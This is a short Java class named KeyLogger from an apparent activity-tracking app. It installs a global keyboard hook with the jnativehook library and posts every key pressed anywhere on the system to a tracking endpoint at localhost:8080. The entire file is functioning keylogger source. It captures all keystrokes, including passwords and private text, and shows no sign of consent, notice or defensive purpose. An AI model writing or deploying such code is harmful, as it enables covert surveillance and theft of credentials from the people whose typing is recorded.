package com.example.trackingapp.Trackers;

import com.example.trackingapp.http.HttpHelper;
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class KeyLogger implements NativeKeyListener {
    private static final String SERVER_URL = "http://localhost:8080/track/keyboard";
    private static final Logger logger = LoggerFactory.getLogger(KeyLogger.class);
    public static void startTracking() {
        GlobalScreen.addNativeKeyListener(new KeyLogger());
        logger.info("KeyLogger started!");
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
        HttpHelper.sendJson(SERVER_URL, String.format("{\"key\":\"%s\"}", keyText));
    }
}
